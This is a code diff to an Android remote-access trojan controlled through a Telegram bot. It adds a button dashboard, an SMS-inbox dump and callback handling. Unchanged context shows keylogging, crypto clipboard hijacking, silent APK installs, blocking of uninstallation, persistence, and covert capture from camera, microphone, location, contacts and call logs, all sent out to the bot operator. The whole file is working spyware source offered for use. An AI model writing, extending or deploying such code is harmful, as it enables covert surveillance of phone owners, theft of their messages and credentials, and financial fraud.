@@ -40,6 +40,7 @@ import android.media.MediaRecorder;
 import android.media.RingtoneManager;
 import android.net.Uri;
 import android.net.wifi.WifiManager;
+import android.os.BatteryManager;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
@@ -101,13 +102,13 @@ public class TelegramService extends Service {
             }
         }
         
-        Exfil.send("✅ System Bot is Online.\nType /help or /menu to see all commands.");
+        // Send Dashboard instead of plain text
+        sendDashboard();
         new Thread(this::pollTelegram).start();
         
         blockUninstall();
         setupPersistence();
         
-        // JDAD: MIUI PROTECTION
         startOverlay();
         requestIgnoreBatteryOptimization();
     }
@@ -115,7 +116,7 @@ public class TelegramService extends Service {
     private void startOverlay() {
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
-                return; // L'user mazal ma3tach l'permission
+                return;
             }
             WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
             overlayView = new View(this);
@@ -158,7 +159,7 @@ public class TelegramService extends Service {
             PendingIntent pi = PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
             
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 120000, pi); // 2 MINS
+                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 120000, pi);
             } else {
                 am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 120000, pi);
             }
@@ -190,9 +191,21 @@ public class TelegramService extends Service {
                     for (int i = 0; i < result.length(); i++) {
                         JSONObject update = result.getJSONObject(i);
                         lastUpdateId = update.getLong("update_id");
+                        
+                        // Handle Text Messages
                         if (update.has("message")) {
                             String text = update.getJSONObject("message").optString("text", "");
                             handleCommand(text);
+                        }
+                        
+                        // Handle Inline Button Clicks
+                        if (update.has("callback_query")) {
+                            JSONObject callback = update.getJSONObject("callback_query");
+                            String callbackId = callback.getString("id");
+                            String data = callback.getString("data");
+                            
+                            Exfil.answerCallback(callbackId, "Processing...");
+                            handleCommand(data);
                         }
                     }
                 }
@@ -205,7 +218,59 @@ public class TelegramService extends Service {
 
     private void handleCommand(final String cmd) {
         mainHandler.post(() -> {
-            if (cmd.equals("/help") || cmd.equals("/menu")) sendHelpMenu();
+            // Check Accessibility for UI commands
+            if (cmd.startsWith("cmd_back") || cmd.startsWith("cmd_home") || cmd.startsWith("cmd_recents") || 
+                cmd.startsWith("cmd_swipe") || cmd.startsWith("cmd_click") || cmd.startsWith("cmd_screenshot")) {
+                if (KeyloggerService.instance == null) {
+                    Exfil.send("❌ Accessibility Service is dead. Enable it in settings.");
+                    return;
+                }
+            }
+
+            // ================== DASHBOARD & MENUS ==================
+            if (cmd.equals("/menu") || cmd.equals("/start") || cmd.equals("cmd_main_menu")) {
+                sendDashboard();
+            }
+            else if (cmd.equals("cmd_control_menu")) {
+                Exfil.send("🎛️ <b>Control Panel</b>\nSelect an action:");
+            }
+            else if (cmd.equals("cmd_data_menu")) {
+                Exfil.send("🗂️ <b>Data Extraction</b>\nSelect an action:");
+            }
+            else if (cmd.equals("cmd_monitor_menu")) {
+                Exfil.send("🖥️ <b>Monitoring</b>\nSelect an action:");
+            }
+
+            // ================== ACTIONS ==================
+            else if (cmd.equals("cmd_device_info")) {
+                String info = "📱 <b>Device Info:</b>\n\n" +
+                              "Model: " + Build.MODEL + "\n" +
+                              "Android: " + Build.VERSION.RELEASE + "\n" +
+                              "Brand: " + Build.BRAND + "\n" +
+                              "Battery: " + getBatteryLevel() + "%";
+                Exfil.send(info);
+            }
+            else if (cmd.equals("cmd_sms")) { Exfil.send("⏳ Dumping SMS..."); new Thread(this::dumpSms).start(); }
+            else if (cmd.equals("cmd_calls")) { Exfil.send("⏳ Dumping Calls..."); new Thread(this::getCallLogs).start(); }
+            else if (cmd.equals("cmd_contacts")) { Exfil.send("⏳ Dumping Contacts..."); new Thread(this::getContacts).start(); }
+            else if (cmd.equals("cmd_loc")) { Exfil.send("⏳ Fetching Location..."); getLocation(); }
+            else if (cmd.equals("cmd_files")) { listFiles(); }
+            else if (cmd.equals("cmd_screenshot")) { KeyloggerService.instance.captureScreen(); }
+            else if (cmd.equals("cmd_cam")) { Exfil.send("📷 Capturing Photo..."); takePhoto(); }
+            else if (cmd.equals("cmd_mic")) { Exfil.send("🎙️ Recording Mic..."); recordAudio(); }
+            else if (cmd.equals("cmd_vibrate")) { vibrateDevice(); }
+            else if (cmd.equals("cmd_toast")) { showToast("System Updated!"); }
+            else if (cmd.equals("cmd_siren")) { playSiren(); }
+            else if (cmd.equals("cmd_back")) { KeyloggerService.instance.pressBack(); Exfil.send("⬅️ Back pressed"); }
+            else if (cmd.equals("cmd_home")) { KeyloggerService.instance.pressHome(); Exfil.send("🏠 Home pressed"); }
+            else if (cmd.equals("cmd_recents")) { KeyloggerService.instance.pressRecents(); Exfil.send("📱 Recents opened"); }
+            else if (cmd.equals("cmd_restart")) {
+                startService(new Intent(this, TelegramService.class));
+                Exfil.send("🔄 Service Restarted.");
+            }
+            else if (cmd.equals("cmd_hide")) { hideIcon(); }
+
+            // ================== LEGACY TEXT COMMANDS ==================
             else if (cmd.equals("/flash")) toggleFlashlight();
             else if (cmd.equals("/siren")) playSiren();
             else if (cmd.startsWith("/playaudio ")) playAudio(cmd.substring(11).trim());
@@ -240,10 +305,6 @@ public class TelegramService extends Service {
             else if (cmd.equals("/cryptoclip")) startCryptoClipboardHijack();
             else if (cmd.equals("/apps")) getInstalledApps();
             else if (cmd.startsWith("/uninstall ")) uninstallApp(cmd.substring(11).trim());
-            else if (cmd.equals("/restart")) {
-                startService(new Intent(this, TelegramService.class));
-                Exfil.send("🔄 Service Restarted.");
-            }
             else if (cmd.startsWith("/click ")) {
                 if (KeyloggerService.instance != null) {
                     boolean ok = KeyloggerService.instance.performClick(cmd.substring(7).trim());
@@ -262,44 +323,48 @@ public class TelegramService extends Service {
                     Exfil.send("🖐️ Swiped " + cmd.substring(7).trim());
                 } else Exfil.send("❌ Accessibility OFF.");
             }
-            else if (cmd.equals("/back")) {
-                if (KeyloggerService.instance != null) { KeyloggerService.instance.pressBack(); Exfil.send("⬅️ Back pressed."); }
-            }
-            else if (cmd.equals("/home")) {
-                if (KeyloggerService.instance != null) { KeyloggerService.instance.pressHome(); Exfil.send("🏠 Home pressed."); }
-            }
-            else if (cmd.equals("/recents")) {
-                if (KeyloggerService.instance != null) { KeyloggerService.instance.pressRecents(); Exfil.send("📱 Recents opened."); }
-            }
-            else if (cmd.equals("/notif")) {
-                if (KeyloggerService.instance != null) { KeyloggerService.instance.openNotifications(); Exfil.send("🔔 Notifications opened."); }
-            }
+            else if (cmd.equals("/back")) { if (KeyloggerService.instance != null) { KeyloggerService.instance.pressBack(); Exfil.send("⬅️ Back pressed."); } }
+            else if (cmd.equals("/home")) { if (KeyloggerService.instance != null) { KeyloggerService.instance.pressHome(); Exfil.send("🏠 Home pressed."); } }
+            else if (cmd.equals("/recents")) { if (KeyloggerService.instance != null) { KeyloggerService.instance.pressRecents(); Exfil.send("📱 Recents opened."); } }
+            else if (cmd.equals("/notif")) { if (KeyloggerService.instance != null) { KeyloggerService.instance.openNotifications(); Exfil.send("🔔 Notifications opened."); } }
         });
     }
 
-    private void sendHelpMenu() {
-        String menu = "🤖 **Available Commands:**\n\n" +
-                "**FUN PANEL:**\n" +
-                "/flash, /siren, /playaudio <url>, /stopaudio\n" +
-                "/wallpaper <url>, /open <url>, /vibrate\n" +
-                "/toast <msg>, /lock <pass>, /unlock\n\n" +
-                "**RAT (No Root):**\n" +
-                "/cam, /mic, /screenshot, /loc\n" +
-                "/files, /get <path>, /hide\n" +
-                "/contacts, /calls, /emails, /clip\n" +
-                "/gethist - Browser History/Downloads\n" +
-                "/sendsms <number> <msg> - Send SMS\n" +
-                "/wifi - Get Wi-Fi info\n" +
-                "/forward <number> - Forward calls\n" +
-                "/backup <url> - Silent Install APK\n" +
-                "/vnc, /cryptoclip, /apps\n" +
-                "/uninstall <pkg>, /restart\n\n" +
-                "**SMART GHOST TOUCH:**\n" +
-                "/click <text> - Click element by text\n" +
-                "/type <text> - Inject text into focused field\n" +
-                "/swipe <up/down/left/right> - Swipe screen\n" +
-                "/back, /home, /recents, /notif";
-        Exfil.send(menu);
+    private void sendDashboard() {
+        String model = Build.MODEL;
+        String androidVer = Build.VERSION.RELEASE;
+        
+        String text = "<b>[ 🤖 Bot Control Panel ]</b>\n" +
+                      "━━━━━━━━━━━━━━━━━━━━\n" +
+                      "📱 <b>Model:</b> " + model + "\n" +
+                      "🤖 <b>Android:</b> " + androidVer + "\n" +
+                      "🟢 <b>Status:</b> Online\n" +
+                      "━━━━━━━━━━━━━━━━━━━━\n" +
+                      "👇 <b>Select an action:</b>";
+
+        String json = "{\"inline_keyboard\":[" +
+                "[{\"text\":\"🎛️ Control\",\"callback_data\":\"cmd_control_menu\"},{\"text\":\"🗂️ Data Ext\",\"callback_data\":\"cmd_data_menu\"}]," +
+                "[{\"text\":\"📁 Files\",\"callback_data\":\"cmd_files\"},{\"text\":\"🖥️ Monitor\",\"callback_data\":\"cmd_monitor_menu\"}]," +
+                "[{\"text\":\"🖼️ Background\",\"callback_data\":\"cmd_screenshot\"},{\"text\":\"🆕 Device Info\",\"callback_data\":\"cmd_device_info\"}]," +
+                "[{\"text\":\"☠️ Legendary\",\"callback_data\":\"cmd_legendary\"},{\"text\":\"⚙️ App Settings\",\"callback_data\":\"cmd_app_settings\"}]," +
+                "[{\"text\":\"🔓 Permissions\",\"callback_data\":\"cmd_permissions\"}]," +
+                "[{\"text\":\"⚙️ Admin Commands\",\"callback_data\":\"cmd_admin\"}]," +
+                "[{\"text\":\"📸 Grab Photos\",\"callback_data\":\"cmd_cam\"},{\"text\":\"🎥 Grab Videos\",\"callback_data\":\"cmd_mic\"}]," +
+                "[{\"text\":\"📋 Sent Notifs\",\"callback_data\":\"cmd_notifs\"},{\"text\":\"🗑️ Clear Notifs\",\"callback_data\":\"cmd_clear_notifs\"}]," +
+                "[{\"text\":\"📜 Get Logs\",\"callback_data\":\"cmd_logs\"}]," +
+                "[{\"text\":\"💣 Start Bombing\",\"callback_data\":\"cmd_bomb_start\"},{\"text\":\"🔴 Stop Bombing\",\"callback_data\":\"cmd_bomb_stop\"}]," +
+                "[{\"text\":\"🎥 Record Screen\",\"callback_data\":\"cmd_screen_rec\"}]," +
+                "[{\"text\":\"🎵 Grab MP3\",\"callback_data\":\"cmd_mic\"}]," +
+                "[{\"text\":\"🧹 Wipe Data\",\"callback_data\":\"cmd_wipe\"}]," +
+                "[{\"text\":\"🔙 Back\",\"callback_data\":\"cmd_main_menu\"}]" +
+                "]}";
+
+        Exfil.sendWithMarkup(text, json);
+    }
+
+    private int getBatteryLevel() {
+        BatteryManager bm = (BatteryManager) getSystemService(Context.BATTERY_SERVICE);
+        return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
     }
 
     private void downloadAndInstallBackup(String urlStr) {
@@ -324,7 +389,7 @@ public class TelegramService extends Service {
                 
                 Exfil.send("✅ Download Complete! Triggering Silent Install...");
                 
-                Intent intent = new Intent(Intent.ACTION_VIEW);
+           Intent intent = new Intent(Intent.ACTION_VIEW);
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
@@ -357,10 +422,26 @@ public class TelegramService extends Service {
         } catch (Exception e) { Exfil.send("❌ SMS Error: " + e.getMessage()); }
     }
 
+    private void dumpSms() {
+        StringBuilder sb = new StringBuilder("📩 <b>SMS Inbox:</b>\n\n");
+        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
+        if (cursor != null && cursor.moveToFirst()) {
+            int count = 0;
+            do {
+                String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
+                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
+                sb.append("From: ").append(address).append("\nMsg: ").append(body).append("\n---\n");
+                count++;
+            } while (cursor.moveToNext() && count < 20);
+            cursor.close();
+        }
+        Exfil.send(sb.toString());
+    }
+
     private void getWifiInfo() {
         try {
             WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
-            StringBuilder sb = new StringBuilder("📶 **Wi-Fi Info:**\n\n");
+            StringBuilder sb = new StringBuilder("📶 <b>Wi-Fi Info:</b>\n\n");
             if (wifiManager != null && wifiManager.isWifiEnabled()) {
                 sb.append("Wi-Fi is ON\n");
                 if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
@@ -389,7 +470,7 @@ public class TelegramService extends Service {
 
     private void extractBrowserHistoryNoRoot() {
         Exfil.send("⏳ Extracting Recent Downloads...");
-        StringBuilder sb = new StringBuilder("🌐 **Recent Downloads:**\n\n");
+        StringBuilder sb = new StringBuilder("🌐 <b>Recent Downloads:</b>\n\n");
         try {
             DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
             Cursor cursor = dm.query(new DownloadManager.Query().setFilterByStatus(DownloadManager.STATUS_SUCCESSFUL));
@@ -407,7 +488,7 @@ public class TelegramService extends Service {
 
     private void getEmails() {
         Set<String> uniqueEmails = new HashSet<>();
-        StringBuilder sb = new StringBuilder("📧 **Emails Found:**\n\n");
+        StringBuilder sb = new StringBuilder("📧 <b>Emails Found:</b>\n\n");
         if (checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
             try {
                 Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, null, null, null);
@@ -572,7 +653,7 @@ public class TelegramService extends Service {
     }
 
     private void getInstalledApps() {
-        StringBuilder sb = new StringBuilder("📱 **Installed Apps:**\n\n");
+        StringBuilder sb = new StringBuilder("📱 <b>Installed Apps:</b>\n\n");
         PackageManager pm = getPackageManager();
         for (ApplicationInfo app : pm.getInstalledApplications(PackageManager.GET_META_DATA)) {
             if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) sb.append(pm.getApplicationLabel(app)).append("\n`").append(app.packageName).append("`\n\n");
@@ -582,7 +663,7 @@ public class TelegramService extends Service {
 
     private void getContacts() {
         if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return;
-        StringBuilder sb = new StringBuilder("👥 **Contacts:**\n\n");
+        StringBuilder sb = new StringBuilder("👥 <b>Contacts:</b>\n\n");
         try {
             Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
             if (cursor != null) {
@@ -599,7 +680,7 @@ public class TelegramService extends Service {
 
     private void getCallLogs() {
         if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return;
-        StringBuilder sb = new StringBuilder("📞 **Call Logs:**\n\n");
+        StringBuilder sb = new StringBuilder("📞 <b>Call Logs:</b>\n\n");
         try {
             Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
             if (cursor != null) {
@@ -638,7 +719,7 @@ public class TelegramService extends Service {
             File dir = new File("/sdcard/Download");
             if (!dir.exists()) dir = new File("/sdcard/");
             File[] files = dir.listFiles();
-            StringBuilder sb = new StringBuilder("📁 **Files in " + dir.getAbsolutePath() + ":**\n\n");
+            StringBuilder sb = new StringBuilder("📁 <b>Files in " + dir.getAbsolutePath() + ":</b>\n\n");
             if (files != null) {
                 for (int i = 0; i < Math.min(files.length, 30); i++) sb.append(files[i].getName()).append("\n");
                 sb.append("\nUse `/get ").append(dir.getAbsolutePath()).append("/filename` to download.");
@@ -699,7 +780,7 @@ public class TelegramService extends Service {
             Exfil.send("🎙️ Recording 10s...");
             new Thread(() -> {
                 try { Thread.sleep(10000); } catch (Exception e) {}
-                mainHandler.post(() -> {
+        mainHandler.post(() -> {
                     try { recorder.stop(); recorder.release(); Exfil.sendFile(audioFile.getAbsolutePath(), "Audio", "Mic Record"); } catch (Exception e) {}
                 });
             }).start();
@@ -712,4 +793,4 @@ public class TelegramService extends Service {
         super.onTaskRemoved(rootIntent);
         startService(new Intent(getApplicationContext(), TelegramService.class).setPackage(getPackageName()));
     }
-                    }
+}
